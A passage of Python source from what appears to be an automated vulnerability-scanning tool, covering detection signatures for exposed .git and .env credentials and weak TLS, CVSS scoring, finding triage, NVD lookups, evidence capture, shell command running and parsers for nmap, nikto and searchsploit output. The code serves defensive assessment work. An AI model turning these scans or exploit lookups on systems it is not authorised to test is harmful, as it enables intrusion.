    (r"root@", "Root prompt in service banner", "critical"),
    (r"(?i)debug mode|debug=true|DEBUG=1", "Debug mode in production service", "high"),
    (r"(?i)phpinfo\(\)", "phpinfo() exposed", "high"),
    (r"(?i)\.git/config\s*[^\n]*\[core\]|(?:^|\n)\s*\[remote\s+\"origin\"\]|repositoryformatversion", "Git repository exposed (config content)", "critical"),
    (r"(?i)\.env[^\n]*[A-Za-z0-9_]{3,}\s*=\s*\S+", ".env with credential content exposed", "critical"),
    (r"(?i)SSLv2|SSLv3|TLSv1\.0|TLSv1\.1", "Deprecated TLS/SSL protocol enabled", "high"),
    (r"(?i)(cipher|protocol|ssl [cv]|tlsv|ssl3|accepted|preferred)\s*[:=]?[^\n]*\b(RC4|DES|3DES|EXPORT|NULL|anon)\b", "Weak cipher suite enabled", "high"),
    (r"(?i)heartbleed|CVE-2014-0160|\bVULNERABLE\b", "Heartbleed or script-confirmed VULNERABLE service", "critical"),
    (r"SNMPv2-MIB::sysDescr", "SNMP public community string accepted", "high"),
]


# Redirect status codes must never constitute a finding by themselves: a
# 3xx answer means "resource moved", it says nothing about a vulnerability.
# Findings may only claim a weakness from the FINAL response after following
# the redirect chain (curl -L), and only where redirect semantics are the
# verified vulnerability itself (open redirect / host-header reflection) is a
# 3xx-with-reflected-Location an actual finding.
REDIRECT_CODES = frozenset({'300', '301', '302', '303', '304', '305', '307', '308'})


# Negated-result guard: a line/detail asserting NON-vulnerability ("NOT
# VULNERABLE", "isn't vulnerable", "does not appear to be vulnerable",
# "non-vulnerable", "is not exploitable", …) must never become a finding.
_NEGATED_RESULT = re.compile(
    r"\bnot\b[^.!?\n;]{0,40}\b(?:vulnerable|exploitable)\b"
    r"|\b(?:isn't|aren't|wasn't|don't|doesn't|didn't|can't)\b[^.!?\n;]{0,40}\bvulnerable\b"
    r"|\bnon[-\s]?vulnerable\b"
    r"|\bnever\s+vulnerable\b",
    re.I)


def sig_matches(output):
    """Line-based anomaly-signature scan yielding (msg, sev) once per signature.

    Negated script results ("NOT VULNERABLE", "isn't vulnerable",
    "does not appear to be vulnerable", …) never yield a finding."""
    seen = set()
    for line in output.splitlines():
        if not line.strip() or _NEGATED_RESULT.search(line):
            continue
        for sig, msg, sev in ANOMALY_SIGNATURES:
            if msg in seen:
                continue
            if re.search(sig, line, re.I):
                seen.add(msg)
                yield msg, sev

# ─────────────────────────────────────────────────────────────────────────────
# CVSS v3.1 — deterministic calculator + per-finding-class vector profiles
# ─────────────────────────────────────────────────────────────────────────────
# Nothing here is guessed: the base score is computed from an explicit vector
# string via the published CVSS v3.1 formulas. When the resulting severity band
# differs from the finding's own severity label the mismatch is surfaced
# (`band_mismatch`) instead of being silently normalised — that is the trigger
# for analyst review rather than an assumption.

_CVSS_METRIC = {
    'AV': {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20},
    'AC': {'L': 0.77, 'H': 0.44},
    'PR': {'N': 0.85, 'L': 0.62, 'H': 0.27},          # Scope=Unchanged
    'PRc': {'N': 0.85, 'L': 0.68, 'H': 0.50},         # Scope=Changed
    'UI': {'N': 0.85, 'R': 0.62},
    'CIA': {'H': 0.56, 'L': 0.22, 'N': 0.00},
}

def _roundup1(x):
    return _math.ceil((x - 1e-9) * 10) / 10

def cvss31_base_score(vector: str):
    """Compute the CVSS v3.1 base score for a 'CVSS:3.1/...' vector string.

    Returns None if the vector is malformed. Pure arithmetic — deterministic."""
    if not vector or not vector.startswith('CVSS:3.1/'):
        return None
    m = {}
    for part in vector.split('/')[1:]:
        if ':' in part:
            k, _, v = part.partition(':')
            m[k] = v
    if not {'AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A'}.issubset(m):
        return None
    try:
        av, ac, ui = _CVSS_METRIC['AV'][m['AV']], _CVSS_METRIC['AC'][m['AC']], _CVSS_METRIC['UI'][m['UI']]
        pr = _CVSS_METRIC['PR' if m['S'] == 'U' else 'PRc'][m['PR']]
        c, i, a = (_CVSS_METRIC['CIA'][m[x]] for x in ('C', 'I', 'A'))
        ist = 1 - ((1 - c) * (1 - i) * (1 - a))
        impact = 6.42 * ist if m['S'] == 'U' else (7.52 * (ist - 0.029) - 3.25 * ((ist - 0.02) ** 15))
        if impact <= 0:          # CVSS v3.1 spec: base score is 0 when impact is nil
            return 0.0
        exploitability = 8.22 * av * ac * pr * ui
        if m['S'] == 'U':
            score = _roundup1(impact + exploitability)
        else:
            score = _roundup1(min(1.08 * (impact + exploitability), 10))
        return round(min(max(score, 0.0), 10.0), 1)
    except KeyError:
        return None

def cvss31_band(score):
    if score is None: return None
    if score == 0: return 'none'
    if score < 4.0: return 'low'
    if score < 7.0: return 'medium'
    if score < 9.0: return 'high'
    return 'critical'

# Curated base vectors per confirmed finding class. Static, reviewable strings;
# AV:N everywhere (every finding is remotely reachable from the scan host).
FINDING_CVSS = {
    "sql_injection":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "blind_sqli":          "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "nosql_injection":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "ssti":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "default_cred_http":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "broken_auth":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "broken_function_auth":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "mass_assignment":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    "bola_idor":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "sensitive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "ssrf":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "ssrf_lfi":            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "unauth_endpoint":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "env_exposed":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "git_exposed":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "git_config":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "git_config_content":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "api_key_exposure":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "db_unauth_access":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "redis_no_auth":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "db_default_cred":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "null_session":        "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "path_traversal":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "host_header_injection":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    "trace_method":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "api_cors_wildcard":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "missing_rate_limit":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
    "verbose_error":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "weak_tls":            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "weak_cipher":         "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "heartbleed":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "expired_cert":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "self_signed_cert":    "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "protocol_vuln":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
    "version_eol":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "version_outdated":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "exploit_available":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "open_port":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "db_exposed":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "cms_wordpress":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cms_joomla":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cms_drupal":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "breach_exposure":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "imds_reachable":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "js_secret_leak":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
}

# Fallback vectors when a finding class has no curated profile — also the
# honest default for anything unclassified (lowest plausible for the label).
_FINDING_CVSS_FALLBACK = {
    "critical": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "high":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "medium":   "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N",
    "low":      "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N",
}

def score_finding(f):
    """Attach a CVSS v3.1 vector + computed base score to a finding (in place).

    The vector is either the curated profile for the finding class or the
    severity-fallback vector; both are explicit, reviewable strings. If the
    computed severity band disagrees with the finding's own label, that
    disagreement is recorded (`band_mismatch`) rather than hidden."""
    sev = f.get('severity', 'info')
    if sev not in ('critical', 'high', 'medium', 'low'):
        f['cvss'] = {"vector": None, "base_score": 0.0, "severity_band": None, "note": "informational — not scored"}
        return f
    vector = FINDING_CVSS.get(f.get('type')) or _FINDING_CVSS_FALLBACK.get(sev)
    score = cvss31_base_score(vector)
    band = cvss31_band(score)
    f['cvss'] = {
        "vector": vector, "base_score": score,
        "severity_band": band,
        "band_mismatch": bool(score is not None and band != sev),
        "source": "computed-cvss3.1" if score is not None else "error",
    }
    return f

# ─────────────────────────────────────────────────────────────────────────────
# FALSE-POSITIVE TRIAGE — deterministic verdict attached to every finding
# ─────────────────────────────────────────────────────────────────────────────
# A vulnerability finding is only 'confirmed' when it rests on concrete artifact
# or contrast evidence (probe body == the real thing, backend behaviour change);
# tool-reported lines are 'tool-confirmed'; everything else is 'needs_review'.
# Status-only recon results are informational. This is the automated triage —
# an analyst can override any verdict via POST /api/session/<sid>/triage.
_EVIDENCE_CONFIRMED_TYPES = {
    "env_exposed", "git_exposed", "git_config", "git_config_content",
    "api_key_exposure", "cms_wordpress", "cms_joomla", "cms_drupal",
    "mass_assignment", "broken_function_auth", "bola_idor", "ssrf", "ssrf_lfi",
    "ssti", "default_cred_http", "broken_auth", "unauth_endpoint",
    "path_traversal", "host_header_injection", "trace_method",
    "sensitive_data_exposure", "db_unauth_access", "redis_no_auth",
    "null_session", "snmp_public", "smb_share", "imds_reachable",
    "js_secret_leak", "breach_exposure", "s3_public_list", "open_redirect",
    "sql_injection", "nosql_injection", "blind_sqli", "drupal_login",
}
_TOOL_CONFIRMED_TYPES = {
    "version_eol", "version_outdated", "exploit_available", "weak_tls",
    "weak_cipher", "heartbleed", "expired_cert", "self_signed_cert",
    "protocol_vuln", "web_finding", "db_default_cred", "db_exposed",
    "open_port", "legacy_os", "cve", "signature_match",
}
_INFO_TYPES = {
    "web_path", "api_endpoint", "subdomain", "tech_fingerprint", "email_discovered",
    "js_endpoint", "sourcemap_exposed", "s3_bucket_probe", "cloud_provider",
    "evidence_capture", "no_breach",
}

def _triage_finding(f):
    sev = f.get('severity', 'info')
    ftype = f.get('type', '')
    if ftype in _INFO_TYPES or sev == 'info':
        verdict, basis = 'info', "informational / status-only recon result — not a vulnerability claim"
    elif ftype in _EVIDENCE_CONFIRMED_TYPES:
        verdict, basis = 'confirmed', "probe body or backend contrast matched the artifact directly"
    elif ftype in _TOOL_CONFIRMED_TYPES:
        verdict, basis = 'tool-confirmed', "reported by an upstream scanner (nmap/nikto/nuclei/sslscan/searchsploit)"
    else:
        verdict, basis = 'needs_review', "single-probe or no artifact content — confirm manually"
    f['triage'] = {"verdict": verdict, "basis": basis, "provenance": "auto", "note": None, "ts": None}
    return f

# Session triage log: one record per finding per substage, appended at the
# single choke point so SSE, /status, PDF and UI stay identical.
def _append_triage_log(sess, sub_id, findings):
    log = sess.get('triage_log', {})
    recs = []
    for i, f in enumerate(findings):
        t = f.get('triage', {})
        recs.append({
            "index": i, "type": f.get('type'), "severity": f.get('severity'),
            "verdict": t.get('verdict'), "basis": t.get('basis'),
            "provenance": t.get('provenance', 'auto'), "note": t.get('note'),
            "ts": t.get('ts') or datetime.now().isoformat(),
        })
    log[sub_id] = recs
    sess['triage_log'] = log

# ─────────────────────────────────────────────────────────────────────────────
# NVD VERIFICATION — service version → CVE cross-reference (no guessing)
# ─────────────────────────────────────────────────────────────────────────────
# CPEs are only built for products with a known vendor/product mapping. The
# NVD `cpeName` filter matches CVEs whose affected config references that exact
# product+version CPE — an NVD-maintained fact, not a keyword guess. Only CVEs
# carrying a real CVSSv3 vector are reported; lookups are cached and timeout.
NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
_NVD_TIMEOUT = 8
NVD_CACHE = {}

# Curated (service token → (vendor, product-name)) CPE mappings. Products not
# listed here are reported as "no CPE mapping — manual review" (never assumed).
CPE_TABLE = {
    "openssh":      ("openbsd", "openssh"),
    "apache":       ("apache", "http_server"),
    "nginx":        ("nginx", "nginx"),
    "vsftpd":       ("vsftpd", "vsftpd"),
    "proftpd":      ("proftpd", "proftpd"),
    "mysql":        ("oracle", "mysql"),
    "mariadb":      ("mariadb", "mariadb"),
    "postgres":     ("postgresql", "postgresql"),
    "postgresql":   ("postgresql", "postgresql"),
    "mongodb":      ("mongodb", "mongodb"),
    "redis":        ("redis", "redis"),
    "elasticsearch":("elastic", "elasticsearch"),
    "php":          ("php", "php"),
    "openssl":      ("openssl", "openssl"),
    "tomcat":       ("apache", "tomcat"),
    "samba":        ("samba", "samba"),
    "exim":         ("exim", "exim"),
    "bind":         ("isc", "bind"),
    "jenkins":      ("jenkins", "jenkins"),
    "iis":          ("microsoft", "internet_information_services"),
    "vsftpd":       ("vsftpd", "vsftpd"),
    "grafana":      ("grafana", "grafana"),
    "wordpress":    ("wordpress", "wordpress"),
    "drupal":       ("drupal", "drupal"),
    "joomla":       ("joomla", "joomla"),
}

def _nvd_verify_cpe(product_cpe, version):
    """Return NVD-verified CVEs for (cpe vendor:product, version) or [].
    [] means genuinely no NVD CPE match (honest negative)."""
    key = (product_cpe, version)
    if key in NVD_CACHE:
        return NVD_CACHE[key]
    results = []
    candidates = list(dict.fromkeys([version] + ([_strip_ver_suffix(version)] if _strip_ver_suffix(version) else [])))
    for cand in candidates:
        if not cand:
            continue
        cpe = f"cpe:2.3:a:{product_cpe}:{cand}:*:*:*:*:*:*:*"
        try:
            req = urllib.request.Request(
                f"{NVD_API}?cpeName={urllib.parse.quote(cpe)}",
                headers={'User-Agent': 'pwm-cve-verify'})
            with urllib.request.urlopen(req, timeout=_NVD_TIMEOUT) as r:
                data = json.load(r)
        except Exception:
            continue
        vulns = data.get('vulnerabilities', [])
        for v in vulns:
            c = v.get('cve', {})
            cid = c.get('id', '')
            met = (c.get('metrics') or {}).get('cvssMetricV31') or (c.get('metrics') or {}).get('cvssMetricV30') or []
            if not met:
                continue
            cv = (met[0].get('cvssData') or {})
            if not cv.get('vectorString') or cv.get('baseScore') is None:
                continue
            results.append({
                "cve": cid, "score": cv['baseScore'], "vector": cv['vectorString'],
                "published": (c.get('published') or '')[:10],
                "reference": ((c.get('references') or [{}])[0].get('url')) or '',
            })
        if results:
            break
    dedup = list({(x['cve'], x['score'], x['vector']): x for x in results}.values())
    dedup.sort(key=lambda x: x['score'], reverse=True)
    NVD_CACHE[key] = dedup[:8]
    return NVD_CACHE[key]

def _strip_ver_suffix(version):
    m = re.match(r'(\d+(?:\.\d+){1,2})', version or '')
    return m.group(1) if m and m.group(1) != version else None

# ─────────────────────────────────────────────────────────────────────────────
# EVIDENCE CAPTURE — screenshot + PCAP per confirmed finding (pre-exploitation)
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_BINS = ['google-chrome', 'chromium', 'chromium-browser']

def _finding_url(f, sess):
    """Best-effort URL for evidence capture. Returns None when we only have a
    host, so no fabricated evidence is produced."""
    target = sess.get('target', '')
    p = str(f.get('path') or '')
    cmd = str(f.get('command') or '')
    if p.startswith('/'):
        return f"http://{target}{p}"
    m = re.search(r'https?://\S+', cmd)
    if m:
        return m.group(0).rstrip('.').replace('"', '')
    return None

def _capture_evidence(f, sess):
    """Screenshot + PCAP for one finding; writes into <outdir>/evidence.
    Returns info dict; never fabricates — if the capture tool errors, the
    record states the error instead of claiming a file exists."""
    evdir = os.path.join(sess['outdir'], 'evidence')
    os.makedirs(evdir, exist_ok=True, mode=0o700)
    idx = len(os.listdir(evdir))
    stamp = datetime.now().strftime('%H%M%S')
    url = _finding_url(f, sess)
    rec = {"finding_type": f.get('type'), "path": f.get('path'), "url": url,
           "screenshots": [], "pcap": None, "errors": []}
    if not url:
        rec["errors"].append("no http(s) endpoint in finding — screenshot skipped")
        return rec

    # Screenshot via headless chrome.
    for binname in _CHROME_BINS:
        path = shutil.which(binname)
        if not path:
            continue
        shot = os.path.join(evdir, f"{idx:02d}_{stamp}_{f.get('type','x')}.png")
        ok = True
        try:
            subprocess.run(
                [path, '--headless=new', '--no-sandbox', '--disable-gpu',
                 '--hide-scrollbars', '--window-size=1280,800',
                 '--virtual-time-budget=4000', f'--screenshot={shot}', url],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=25)
            if os.path.exists(shot) and os.path.getsize(shot) > 800:
                with open(shot, 'rb') as fh:
                    magic = fh.read(8)
                if magic.startswith(b'\x89PNG'):
                    rec["screenshots"].append(shot)
            else:
                ok = False
        except Exception:
            ok = False
        if rec["screenshots"]:
            break
        if not ok:
            rec["errors"].append(f"{binname} screenshot produced no valid PNG")
    if not rec["screenshots"] and os.path.exists(shot):
        try: os.remove(shot)
        except OSError: pass

    # PCAP: tcpdump during a short re-probe of the same URL.
    if shutil.which('tcpdump'):
        pcap = os.path.join(evdir, f"{idx:02d}_{stamp}_{f.get('type','x')}.pcap")
        try:
            host = sess['target']
            if ':' in host: host = host.split(':')[0]
            proc = subprocess.Popen(
                f"tcpdump -i any -s 0 -c 100 -w '{pcap}' host '{host}' 2>/dev/null",
                shell=True)
            try:
                subprocess.run(['curl', '-skL', '--max-time', '5', '-o', '/dev/null', url],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
            except Exception:
                pass
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            if os.path.exists(pcap) and os.path.getsize(pcap) > 24:
                with open(pcap, 'rb') as fh:
                    magic = fh.read(4)
                if magic in (b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4', b'\x4d\x3c\xb2\xa1', b'\xa1\xb2\x3c\x4d'):
                    rec["pcap"] = pcap
                else:
                    rec["errors"].append("pcap magic mismatch — file discarded")
            else:
                rec["errors"].append("tcpdump produced no capture")
        except Exception as e:
            rec["errors"].append(f"pcap capture failed: {e}")
    else:
        rec["errors"].append("tcpdump not installed — pcap skipped")
    return rec

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def detect_target_type(t):
    t = t.strip()
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$', t): return 'network'
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', t): return 'ip'
    if re.match(r'^https?://', t): return 'url'
    return 'domain'

def clean_target(raw):
    t = re.sub(r'^https?://', '', raw.strip()).rstrip('/')
    if not t:
        return ''
    if ':' in t:
        if t.startswith('['):                      # [::1] or [::1]:8080
            return t[1:].split(']')[0]
        host = t.split('/')[0]
        if host.count(':') >= 2:                   # bare IPv6 literal (with optional /CIDR)
            try:
                return str(ipaddress.ip_interface(t).ip)
            except ValueError:
                return host
        try:                                       # hostname:port / ip:port
            if re.fullmatch(r'[^:]+:\d{1,5}', host):
                return host.rsplit(':', 1)[0]
        except Exception:
            pass
        return host
    return t.split('/')[0]

def is_valid_target(t):
    """Allow only hostnames, IPv4 (optionally with CIDR) and IPv6 literals.
    Rejects anything containing shell metacharacters (command injection guard)."""
    if not t or len(t) > 253:
        return False
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}(/\d{1,2})?$', t):
        octets = t.split('/')[0].split('.')
        cidr = t.split('/')[1] if '/' in t else None
        if cidr is not None and not (0 <= int(cidr) <= 32):
            return False
        return all(0 <= int(o) <= 255 for o in octets)
    if re.match(r'^[0-9a-fA-F:]+$', t) and ':' in t:  # IPv6 literal
        return True
    # hostname / FQDN
    return bool(re.match(r'^[A-Za-z0-9]([A-Za-z0-9\-_.]*[A-Za-z0-9])?$', t)) and '..' not in t

def infer_network(target):
    """Derive a scan scope without inventing ranges.
    A single IP or hostname scans only that host; only explicit CIDR input is kept as a range."""
    if '/' in target:
        return target
    return target

def make_cmd(template, sess):
    ports = sess.get('ports_found') or '21,22,23,25,53,80,110,443,445,3306,3389,8080'
    vals = {
        'target': sess['target'],
        'outdir': sess['outdir'],
        'ports': ports,
        'banner_search': sess.get('banner_search', sess['target']),
        'network': sess.get('network', infer_network(sess['target'])),
    }
    def repl(m):
        if m.group(0) == '{{':
            return '{'
        if m.group(0) == '}}':
            return '}'
        key = m.group(1)
        return str(vals.get(key, m.group(0)))
    return re.sub(r'\{\{|\}\}|\{(\w+)\}', repl, template)

def push(sid, event, data):
    q = output_queues.get(sid)
    if not q:
        return
    if q.full():
        try:
            q.get_nowait()
        except queue.Empty:
            pass
    q.put({"event": event, "data": json.dumps(data)})

def find_sub(sub_id):
    for stage in CHAIN:
        for sub in stage['substages']:
            if sub['id'] == sub_id:
                return sub
    return None

def find_stage_for_sub(sub_id):
    for stage in CHAIN:
        for sub in stage['substages']:
            if sub['id'] == sub_id:
                return stage
    return None

# ─────────────────────────────────────────────────────────────────────────────
# COMMAND RUNNER
# ─────────────────────────────────────────────────────────────────────────────
_SUDO_OK = None
def _sudo_available():
    """Probe whether passwordless sudo works. Result is cached — never prompts."""
    global _SUDO_OK
    if _SUDO_OK is None:
        try:
            _SUDO_OK = subprocess.run(['sudo', '-n', 'true'],
                                      capture_output=True, timeout=5).returncode == 0
        except Exception:
            _SUDO_OK = False
    return _SUDO_OK

def run_command(sid, sub_id, cmd, timeout=PWM_CMD_TIMEOUT):
    push(sid, "output", {"substage": sub_id, "line": f"$ {cmd}", "type": "cmd"})
    if timeout is not None and timeout <= 0:
        timeout = None
    lines = []
    ansi = re.compile(r'\x1b\[[0-9;]*[mGKHF]')
    MAX_LINES = 100000
    stop_reader = threading.Event()

    def _emit(raw):
        line = ansi.sub('', raw.decode('utf-8', 'replace').rstrip('\r\n'))
        lines.append(line)
        if len(lines) > MAX_LINES:
            del lines[:len(lines) - MAX_LINES]
        push(sid, "output", {"substage": sub_id, "line": line, "type": "stdout"})

    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=False, bufsize=0,
                                env={**os.environ, 'TERM': 'dumb'},
                                start_new_session=True)
    except Exception as e:
        msg = f"[ERROR: {e}]"
        push(sid, "output", {"substage": sub_id, "line": msg, "type": "error"})
        push(sid, "output", {"substage": sub_id, "line": f"[exit -1]", "type": "meta"})
        return msg, -1

    fd = proc.stdout.fileno()

    def reader():
        buf = b''
        try:
            while True:
                rlist, _, _ = select.select([fd], [], [], 1.0)
                if rlist:
                    chunk = os.read(fd, 65536)
                    if not chunk:
                        break
                    buf += chunk
                    *complete, buf = buf.split(b'\n')
                    for raw in complete:
                        _emit(raw)
                    if len(buf) > 1_000_000:
                        _emit(buf)
                        buf = b''
                    continue
                if stop_reader.is_set():
                    while True:
                        rlist2, _, _ = select.select([fd], [], [], 0)
                        if not rlist2:
                            break
                        chunk = os.read(fd, 65536)
                        if not chunk:
                            break
                        buf += chunk
                        *complete, buf = buf.split(b'\n')
                        for raw in complete:
                            _emit(raw)
                    break
        except (OSError, ValueError):
            pass
        finally:
            if buf:
                _emit(buf)

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    rc = 0
    timed_out = False
    try:
        rc = proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        rc = -1
        msg = f"[TIMEOUT {timeout:g}s]" if timeout else "[TIMEOUT]"
        lines.append(msg)
        push(sid, "output", {"substage": sub_id, "line": msg, "type": "error"})
    finally:
        if timed_out or proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                try:
                    proc.kill()
                except Exception:
                    pass
        stop_reader.set()
        t.join(timeout=3)
        if t.is_alive():
            try:
                proc.stdout.close()
            except Exception:
                pass
        try:
            proc.stdout.close()
        except Exception:
            pass
    push(sid, "output", {"substage": sub_id, "line": f"[exit {rc}]", "type": "meta"})
    return "\n".join(lines), rc


# ─────────────────────────────────────────────────────────────────────────────
# PARSERS — existing
# ─────────────────────────────────────────────────────────────────────────────
def parse_nmap(output):
    findings = []
    best = {}
    for line in output.splitlines():
        m = re.match(r'(\d+)/(tcp|udp)\s+(open\S*)\s+(\S+)\s*(.*)', line)
        if m:
            svc, ver = m.group(4), m.group(5).strip()
            key = (m.group(1), m.group(2))
            f = {"type":"open_port","port":m.group(1),"proto":m.group(2),
                 "service":svc,"version":ver,"severity":"info",
                 "detail":f"{m.group(1)}/{m.group(2)} {svc} {ver}",
                 "path":f":{m.group(1)}"}
            prev = best.get(key)
            if prev is None:
                best[key] = f
                findings.append(f)
            elif ver or not prev['version']:
                # a later table (e.g. -sV run after the full-port sweep) wins
                prev.update(f)
    if 'OS details:' in output or 'OS CPE:' in output:
        for line in output.splitlines():
            if 'OS details:' in line or 'Running:' in line:
                findings.append({"type":"os_detect","detail":line.strip(),"severity":"info","path":"network"})
    return findings

def parse_vulners(output):
    findings = []
    seen = set()
    for line in output.splitlines():
        cve = re.search(r'(CVE-\d{4}-\d{4,})', line)
        port_m = re.search(r'(\d+)/tcp', line)
        if cve and cve.group(1) not in seen:
            seen.add(cve.group(1))
            score_m = re.search(r'(\d+\.\d+)', line)
            score = float(score_m.group(1)) if score_m else 0.0
            sev = "critical" if score>=9 else "high" if score>=7 else "medium" if score>=4 else "low"
            path = f":{port_m.group(1)}" if port_m else "service"
            findings.append({"type":"cve","cve":cve.group(1),"score":score,"severity":sev,
                              "detail":line.strip(),"path":path,
                              "command":f"nmap -sV --script=vulners --script-args mincvss=4.0"})
    return findings

def parse_searchsploit(output):
    findings = []
    for line in output.splitlines():
        if '|' in line and 'Exploit Title' not in line and '---' not in line and len(line.strip())>5:
            parts = [p.strip() for p in line.split('|')]
            if len(parts) >= 2 and parts[0]:
                findings.append({"type":"exploit_available","title":parts[0],
                                  "path":"searchsploit match","severity":"high",
                                  "detail":parts[0],
                                  "command":f"searchsploit -m {parts[-1].strip()}"})
    return findings

def parse_nikto(output):
    findings = []
    for line in output.splitlines():
        if line.startswith('+ ') and 'Target' not in line and 'Start Time' not in line:
            body = line[2:].strip()
            sev = ("critical" if any(x in body.lower() for x in ['rce','remote code','execut','inject','cve-20'])
                   else "high" if any(x in body.lower() for x in ['vulner','dangerous','default','exposed','outdated'])
                   else "medium" if any(x in body.lower() for x in ['allow','enable','disclos'])
                   else "low")
            uri_m = re.search(r'((?:/[^\s:]+)+)', body)
            path = uri_m.group(1) if uri_m else "web"
            findings.append({"type":"web_finding","detail":body,"severity":sev,
                              "path":path,"command":"nikto -h <target>"})
    return findings

def parse_ssl(output):
    findings = []
    for line in output.splitlines():
        if _NEGATED_RESULT.search(line):
            continue
        ll = line.lower()
        if any(x in ll for x in ['sslv2','sslv3','tlsv1.0','tlsv1.1']):
            findings.append({"type":"weak_tls","detail":line.strip(),"severity":"high",
                              "path":":443","command":"sslscan <target>:443"})
        if any(x in ll for x in ['rc4','des ','3des','export','null cipher','anonymous']):
            findings.append({"type":"weak_cipher","detail":line.strip(),"severity":"high",
                              "path":":443","command":"sslscan <target>:443"})
        if 'heartbleed' in ll and 'vulnerable' in ll:
            findings.append({"type":"heartbleed","detail":line.strip(),"severity":"critical",
                              "path":":443","command":"nmap --script=ssl-heartbleed -p 443 <target>"})
        if 'self signed' in ll or 'self-signed' in ll:
